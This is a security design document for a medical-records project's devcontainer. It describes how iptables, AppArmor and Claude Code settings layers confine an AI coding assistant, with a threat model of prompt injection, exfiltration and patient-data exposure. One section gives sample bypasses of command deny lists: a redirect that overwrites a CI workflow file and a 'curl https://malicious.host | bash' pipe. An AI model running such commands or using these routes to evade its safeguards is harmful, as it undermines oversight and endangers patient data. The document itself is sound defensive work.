# Devcontainer AI Security Constraints

> **Who this is for**: developers who use the CARLOS EMR devcontainer with Claude Code
> (or any AI coding assistant) and want to understand or tune the security controls.

---

## Overview

Running an AI coding assistant (Claude Code) in a development environment introduces
unique risks that differ from typical developer misuse:

- The assistant executes shell commands autonomously, not just once per developer
  request, but in rapid multi-step chains.
- Command-level deny lists (`.claude/settings.json`) can be bypassed by shell
  redirects, pipes, and indirection.
- A single confused or adversarial prompt injection could trigger a cascade of
  harmful operations.

This document describes a layered security model for the CARLOS EMR devcontainer
that addresses those risks through **OS kernel-level enforcement** rather than
relying solely on command pattern matching.

---

## Threat Model

| Threat | Risk | Mitigation |
|--------|------|-----------|
| AI connects to an external/production DB | **HIGH** — PHI exposure | iptables rules (Layer 1) |
| AI overwrites `.git/` or workflow files | **HIGH** — supply-chain attack | AppArmor profile (Layer 2) + `.claude/settings.json` |
| AI overwrites DB seed/init SQL | **MEDIUM** — corrupts schema | AppArmor profile (Layer 2) + `.claude/settings.json` |
| AI exfiltrates data via network | **MEDIUM** | iptables rules (Layer 1) |
| Shell redirect bypasses command deny list | **MEDIUM** | AppArmor filesystem rules |
| Dangerous kernel capabilities abuse | **LOW** (container is already isolated) | AppArmor capability rules |

### Biggest Risk: External Database Connection

The `carlos` devcontainer connects to a MariaDB instance (`db`) running in the same
Docker Compose project.  If Claude Code were to construct a MySQL CLI command pointing
at an external host (e.g., a production database whose credentials are present in
environment variables or config files), it could read or corrupt real patient data.

**Mitigation**: At container startup, `setup-network-policy.sh` inserts iptables rules
that allow port 3306/3307 connections **only** to the `db` container's IP address and
reject all other outbound database connections at the kernel level.  This cannot be
bypassed with shell tricks.

---

## Security Layers

```
┌─────────────────────────────────────────────────────────────────┐
│  Layer 0 — Docker isolation (always active)                     │
│  Container network namespace, cgroups, default seccomp profile  │
└─────────────────────────┬───────────────────────────────────────┘
                          │
┌─────────────────────────▼───────────────────────────────────────┐
│  Layer 1 — iptables network policy (enabled by default)         │
│  • Blocks outbound MySQL/MariaDB to non-devcontainer hosts       │
│  • Blocks outbound PostgreSQL to all hosts (no PG in devcontainer)  │
│  • Applied at container startup via postStartCommand            │
└─────────────────────────┬───────────────────────────────────────┘
                          │
┌─────────────────────────▼───────────────────────────────────────┐
│  Layer 2 — AppArmor MAC profile (opt-in, Linux hosts only)      │
│  • Denies writes to .git/, .github/workflows/, seed SQL files   │
│  • Denies dangerous capabilities: sys_admin, sys_module, etc.   │
│  • Denies ptrace (process injection prevention)                  │
│  • Denies mount/umount (namespace escape prevention)             │
└─────────────────────────┬───────────────────────────────────────┘
                          │
┌─────────────────────────▼───────────────────────────────────────┐
│  Layer 3 — .claude/settings.json command rules (always active)  │
│  • Allow/ask/deny lists for 50+ command patterns                │
│  • Pre-tool-use hooks (SQL safety, OWASP encoding checks)       │
│  Limitation: bypassable via shell redirection/indirection       │
└─────────────────────────────────────────────────────────────────┘
```

**Layers 1 and 2 cannot be bypassed by shell tricks** because they operate in the
Linux kernel, outside the process being constrained.

---

## Layer 1 — iptables Network Policy

### Files

- **`.devcontainer/security/setup-network-policy.sh`** — the policy script
- **`.devcontainer/docker-compose.yml`** — `cap_add: [NET_ADMIN]` enables iptables

### How it works

1. At container startup, `devcontainer.json`'s `postStartCommand` runs
   `setup-network-policy.sh` inside the `carlos` container.
2. The script resolves the `db` hostname to an IP address (Docker internal DNS).
3. It creates a custom iptables chain `CARLOS_AI_POLICY` and inserts it at the
   top of the `OUTPUT` chain.
4. Rules in the chain:

```
CARLOS_AI_POLICY rules (in order)
──────────────────────────────────
ACCEPT  dst=<db-IP>  tcp dport=3306   ← Allow devcontainer DB
ACCEPT  dst=<db-IP>  tcp dport=3307   ← Allow devcontainer DB proxy
REJECT  any          tcp dport=3306   ← Block all other MySQL/MariaDB
REJECT  any          tcp dport=3307   ← Block all other MySQL proxy
REJECT  any          tcp dport=5432   ← Block all PostgreSQL (no PG in devcontainer)
```

### Viewing the rules

```bash
# Inside the container
iptables -L CARLOS_AI_POLICY -n -v --line-numbers
```

### NET_ADMIN capability

`cap_add: [NET_ADMIN]` in `docker-compose.yml` grants the container permission to
manipulate its own network namespace (iptables rules, routing).  It does **not**
grant access to the host's network configuration.

### Graceful degradation

The script exits 0 in all error conditions (missing `iptables` binary, missing
`NET_ADMIN` capability, unresolvable hostname) so that the container starts normally
even when the policy cannot be applied.  A warning is printed to stderr.

---

## Layer 2 — AppArmor MAC Profile (Opt-In)

### Files

- **`.devcontainer/security/apparmor-carlos-dev.profile`** — the AppArmor profile
- **`.devcontainer/security/load-apparmor-host.sh`** — host-side loading helper

### Requirements

- Linux host with AppArmor enabled (`sudo aa-status` must succeed)
- Not available on macOS or Windows (those platforms use a Linux VM for Docker,
  and AppArmor is typically not exposed to user profiles in that VM)

### Enabling the profile

```bash
# Step 1: Load the profile on the host machine (run once)
sudo bash .devcontainer/security/load-apparmor-host.sh

# Verify
sudo aa-status | grep carlos-dev-container

# Step 2: Uncomment security_opt in .devcontainer/docker-compose.yml:
#   security_opt:
#     - apparmor:carlos-dev-container

# Step 3: Rebuild the devcontainer
# VS Code: Dev Containers: Rebuild Container
```

### What the profile enforces

```
File system
───────────
/workspace/**              rw   (full access to project)
/workspace/.git/**         --   (deny write — backstop for .claude rules)
/workspace/.github/workflows/**  --  (deny write — CI/CD protection)
/workspace/database/mysql/oscarinit*.sql  --  (deny write — schema integrity)
/workspace/database/mysql/oscardata*.sql  --  (deny write — schema integrity)
/workspace/database/mysql/icd*.sql        --  (deny write — schema integrity)
/workspace/database/mysql/SnomedCore/**   --  (deny write — schema integrity)
/workspace/database/mysql/olis/**         --  (deny write — schema integrity)
/workspace/database/mysql/caisi/**        --  (deny write — schema integrity)
/tmp/**                    rw   (full access to temp dirs)
/root/**                   rw   (Maven cache, npm, etc.)
/usr/local/tomcat/**       rw   (Tomcat installation)
/** (everything else)       r   (read-only everywhere else)

Capabilities
────────────
Allowed: chown, dac_override, dac_read_search (JVM/Maven file reads across UIDs),
         fowner, fsetid, kill, setgid, setuid,
         setpcap (capability bounding-set management by container runtime),
         net_bind_service, net_raw, sys_chroot, audit_write, mknod, net_admin
Denied:  sys_ptrace, sys_admin, sys_module, sys_rawio, sys_boot, sys_time,
         wake_alarm, mac_admin, mac_override

Network
───────
All socket types allowed (destination filtering done by iptables/Layer 1)

Process
───────
mount/umount: denied
ptrace: denied
```

### Removing the profile

```bash
sudo apparmor_parser -R .devcontainer/security/apparmor-carlos-dev.profile
# Also comment out the security_opt block in docker-compose.yml and rebuild.
```

---

## Relationship to `.claude/settings.json`

`.claude/settings.json` operates at the **application level**: Claude Code checks
these rules before executing any tool.  They are enforced by the Claude Code process
itself and are therefore bypassable via:

- Shell redirects: `echo "malicious" > /workspace/.github/workflows/ci.yml`
- Pipes: `curl https://malicious.host | bash`
- Subshells and variable expansion tricks

The iptables and AppArmor layers operate at the **kernel level** and intercept
system calls regardless of how the process was invoked.  They provide a backstop
that shell-level tricks cannot circumvent.

### Combined effect

| Restriction | `.claude/settings.json` | Layer 1 (iptables) | Layer 2 (AppArmor) |
|-------------|------------------------|-------------------|-------------------|
| Block external DB (port 3306) | ✓ (pattern deny) | ✓ (kernel, always) | — |
| Block `.git/` writes | ✓ (Write deny) | — | ✓ (kernel, opt-in) |
| Block workflow writes | ✓ (Write deny) | — | ✓ (kernel, opt-in) |
| Block seed SQL writes | ✓ (Write deny) | — | ✓ (kernel, opt-in) |
| Block `rm -rf` | ✓ (Bash deny) | — | — |
| Block `git push --force` | ✓ (Bash deny) | — | — |

---

## Alternative Approaches Considered

### Landlock LSM

Linux kernel 5.13+ includes **Landlock**, an unprivileged sandboxing mechanism that
can restrict filesystem paths without root.  It can be applied per-process rather
than to the whole container.

**Pros**: more targeted than AppArmor (per-process), no host setup required  
**Cons**: requires kernel 5.13+, userspace tooling is less mature, does not cover
network access (as of kernel 6.7)

A Landlock-based approach would wrap the `claude` process itself:

```bash
# Hypothetical — requires landlock-cli or a wrapper binary
landlock-cli \
  --fs-rw /workspace \
  --fs-rw /tmp \
  --fs-ro / \
  --deny /workspace/.git \
  --deny /workspace/.github/workflows \
  -- claude ...
```

This is tracked for future investigation when the tooling matures.

### Bubblewrap / Firejail

Userspace sandbox tools that can create a restricted execution environment without
kernel module support.

- **Bubblewrap** (`bwrap`): low-level, used by Flatpak; good filesystem namespacing
- **Firejail**: higher-level, many built-in profiles

These are viable alternatives if AppArmor is not available on the host.  They would
require a wrapper script around the `claude` command.

### SELinux

SELinux provides stronger MAC than AppArmor but is more complex to configure and
primarily targets Red Hat/Fedora environments.  The devcontainer uses a Debian/Ubuntu
base image where AppArmor is the standard MAC framework.  Dan Walsh's work on
SELinux container policies (referenced in the issue) is directly applicable for
Podman-based setups on RHEL/Fedora hosts.

### Docker's seccomp Profile

The default Docker seccomp profile already blocks ~40 dangerous syscalls.  A custom
profile could further restrict available syscalls (e.g., block `ptrace`, `mount`,
`kexec_load`).  This is complementary to AppArmor and iptables rather than a
replacement.

---

## Prior Art

- **Dan Walsh (Red Hat)** — "Using SELinux to constrain local AI engine containers"
  (referenced in issue): <https://danwalsh.livejournal.com> — directly applicable
  for Podman/SELinux setups; the AppArmor profile in this repo is a Docker/AppArmor
  translation of the same principles.
- **Docker AppArmor documentation**:
  <https://docs.docker.com/engine/security/apparmor/>
- **Landlock LSM** (Linux kernel 5.13+):
  <https://docs.kernel.org/userspace-api/landlock.html>
- **Bubblewrap** (rootless container sandboxing):
  <https://github.com/containers/bubblewrap>

---

## Enabling/Disabling Individual Layers

### Disable iptables network policy

Remove or comment out the `postStartCommand` line in `.devcontainer/devcontainer.json`
and remove `cap_add: [NET_ADMIN]` from `docker-compose.yml`, then rebuild.

### Disable AppArmor profile

Comment out the `security_opt` block in `docker-compose.yml` and rebuild.  Optionally
remove the profile from the host kernel:

```bash
sudo apparmor_parser -R .devcontainer/security/apparmor-carlos-dev.profile
```

### Relax `.claude/settings.json` rules

Once kernel-level constraints (Layers 1 and 2) are in place, some of the more
conservative `ask` rules in `.claude/settings.json` can be moved to `allow`, reducing
interactive confirmation prompts.  For example, once AppArmor prevents writing to
`.git/` at the kernel level, the corresponding `Write(path:.git/**)` deny rule in
settings.json becomes redundant — but we recommend keeping it as defence-in-depth.

---

## Security Model Summary

```
Goal: Allow more automation while maintaining safety.

Strategy: Move from "constrain every command" (fragile, bypassable)
          to "constrain the environment, then trust commands within it"
          (kernel-enforced, not bypassable by shell tricks).

Layers:
  1. iptables (kernel) — network destination enforcement (ENABLED BY DEFAULT)
  2. AppArmor (kernel) — filesystem + capability MAC (OPT-IN, Linux only)
  3. .claude/settings.json — command-level rules (always active, defence-in-depth)
  0. Docker isolation — baseline container isolation (always active)

Result:
  - External DB connections are blocked at the kernel level regardless of
    how the mysql/mariadb CLI is invoked.
  - Critical path writes (.git, workflows, seed SQL) have dual enforcement
    (AppArmor + .claude/settings.json).
  - Some conservative "ask" rules in settings.json can be relaxed to "allow"
    once kernel layers are enabled, reducing confirmation prompts.
```
